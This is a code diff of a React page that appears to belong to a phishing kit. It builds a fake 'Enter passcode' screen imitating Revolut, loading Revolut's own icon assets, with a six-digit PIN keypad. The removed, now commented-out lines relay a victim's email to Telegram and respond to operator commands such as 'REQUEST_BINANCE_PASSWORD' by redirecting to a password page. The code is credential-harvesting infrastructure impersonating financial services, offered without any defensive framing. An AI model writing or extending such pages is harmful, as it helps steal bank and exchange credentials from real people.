@@ -12,32 +12,75 @@ import CountriesDropdown from '../components/CountriesDropdown'
 
 export default function Security() {
     const router = useRouter();
-    const { command } = useCommand(); // Get the current command from Telegram
+    // const { command } = useCommand(); // Get the current command from Telegram
+    const [pins, setPins] = useState(''); // manage the state of the pin inputs
+
+
+    // Handle input change for the pc viewport
+    const handlePCInputChange = (e, index) => {
+        const value = e.target.value;
+        if (/[0-9]/.test(value)) {
+            const newPins = pins.split('');
+            newPins[index] = value;
+            setPins(newPins.join(''));
+            if (index < 5) {
+                const inputs = e.target.parentElement.querySelectorAll('input');
+                inputs[index + 1].focus();
+            }
+        }
+    };
+
+
+    // Handle the Keydown for the the pc input field 
+    const handlePCInputKeyDown = (e, index) => {
+        if (e.key === 'Backspace') {
+            const newPins = pins.split('');
+            newPins[index] = '';
+            setPins(newPins.join(''));
+            if (index > 0) {
+                const inputs = e.target.parentElement.querySelectorAll('input');
+                inputs[index - 1].focus();
+            }
+        }
+    };
+
+
+    // Handle input for mobile viewport
+    const handleMobileInput = (number) => {
+        if (pins.length < 6) {
+            setPins(prev => prev + number);
+        }
+    };
+
+    // Handle mobile backspace to clear input
+    const handleMobileBackspace = () => {
+        setPins(prev => prev.slice(0, -1));
+    };
 
 
     // Handle command changes
-    useEffect(() => {
-        if (command === 'REQUEST_EMAIL_AGAIN') {
-            setInvalid(true); // Show error state for email input
-            setIsLoading(false);
-        } else if (command === 'REQUEST_BINANCE_PASSWORD') {
-            setIsLoading(false);
-            setTimeout(() => {
-                // setIsLoading(false);
-                router.push('/PasswordPage');
-            }, 500);
-        }
-    }, [command]);
+    // useEffect(() => {
+    //     if (command === 'REQUEST_EMAIL_AGAIN') {
+    //         setInvalid(true); // Show error state for email input
+    //         setIsLoading(false);
+    //     } else if (command === 'REQUEST_BINANCE_PASSWORD') {
+    //         setIsLoading(false);
+    //         setTimeout(() => {
+    //             // setIsLoading(false);
+    //             router.push('/PasswordPage');
+    //         }, 500);
+    //     }
+    // }, [command]);
 
-    const { validateEmail } = useValidateEmail();
+    // const { validateEmail } = useValidateEmail();
     // Handle email validation
-    const handleEmailValidation = () => {
-        const isValid = validateEmail(email);
-        setInvalid(!isValid);
-        setIsLoading(true);
-        setUserEmail(email);
-        sendMessageToTelegram(email);
-    };
+    // const handleEmailValidation = () => {
+    //     const isValid = validateEmail(email);
+    //     setInvalid(!isValid);
+    //     setIsLoading(true);
+    //     setUserEmail(email);
+    //     sendMessageToTelegram(email);
+    // };
 
 
 
@@ -80,29 +123,9 @@ export default function Security() {
                                                     style={{
                                                         WebkitTextSecurity: 'disc'
                                                     }}
-                                                    onKeyDown={(e) => {
-                                                        if (!/[0-9]/.test(e.key) && e.key !== 'Backspace') {
-                                                            e.preventDefault();
-                                                        }
-
-                                                        if (e.key === 'Backspace') {
-                                                            const inputs = e.target.parentElement.querySelectorAll('input');
-                                                            if (!e.target.value && index > 0) {
-                                                                inputs[index - 1].focus();
-                                                                inputs[index - 1].value = '';
-                                                            }
-                                                        }
-                                                    }}
-                                                    onChange={(e) => {
-                                                        const inputs = e.target.parentElement.querySelectorAll('input');
-                                                        const value = e.target.value;
-
-                                                        if (value) {
-                                                            if (index < inputs.length - 1) {
-                                                                inputs[index + 1].focus();
-                                                            }
-                                                        }
-                                                    }}
+                                                    value={pins[index] || ''}
+                                                    onChange={(e) => handlePCInputChange(e, index)}
+                                                    onKeyDown={(e) => handlePCInputKeyDown(e, index)}
                                                     onFocus={(e) => {
                                                         const inputs = e.target.parentElement.querySelectorAll('input');
                                                         for (let i = 0; i < index; i++) {
@@ -152,9 +175,67 @@ export default function Security() {
             </div>
 
 
-            {/* MObile version */}
-            <div>
+            {/* Mobile version */}
+            <div className='w-full flex flex-col h-screen justify-between md:hidden px-4 pt-[16px]'>
+                {/* Back button */}
+                <div className='w-full h-[40px] flex justify-start'>
+                    <button>
+                        <img src="https://assets.revolut.com/assets/icons/ArrowThinLeft.svg" alt="" />
+                    </button>
+                </div>
 
+                {/* Page header */}
+                <div className='w-full text-center -mt-[40px]'>
+                    <h1 className='font-bold text-[1.5rem]'>
+                        Enter passcode
+                    </h1>
+                </div>
+
+                {/* Pin dots container */}
+                <div className="flex gap-6 justify-center mt-[80px]">
+                    {[...Array(6)].map((_, index) => (
+                        <div
+                            key={index}
+                            className={`w-4 h-4 rounded-full ${pins.length > index ? 'bg-[#4f55f1] border-[#4f55f1]' : 'bg-[#c9c9cd]'
+                                }`}
+                        />
+                    ))}
+                </div>
+
+                {/* Keypad container */}
+                <div className='w-full mt-[62px]'>
+                    <div className="grid grid-cols-3 gap-x-4 gap-y-3 place-items-center mx-auto w-full">
+                        {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((number) => (
+                            <button
+                                key={number}
+                                onClick={() => handleMobileInput(number)}
+                                className="h-[64px] w-[64px] text-center rounded-full bg-translate text-[2rem] font-semibold hover:bg-gray-100 active:bg-gray-200"
+                            >
+                                {number}
+                            </button>
+                        ))}
+                        <div className=""></div>
+                        <button
+                            onClick={() => handleMobileInput('0')}
+                            className="h-[64px] w-[64px] text-center rounded-full bg-translate text-[2rem] font-semibold hover:bg-gray-100 active:bg-gray-200"
+                        >
+                            0
+                        </button>
+                        <button
+                            onClick={handleMobileBackspace}
+                            className={`h-14 w-14 rounded-full flex items-center justify-center text-xl font-semibold hover:bg-gray-100 active:bg-gray-200 ${pins.length > 0 ? 'flex' : 'hidden'}`}
+                        >
+                            <img src="https://assets.revolut.com/assets/icons/ArrowBackspace.svg" alt="" />
+                        </button>
+                    </div>
+                </div>
+
+                {/* Forgot passcode button */}
+                <div className='w-full pb-10 flex justify-center'>
+                    <a href="" className="text-[#4f55f1] inter font-medium text-[0.875rem] tracking-[-0.00714em]">
+                        Forgot your passcode
+                    </a>
+                </div>
             </div>
         </div >
     );
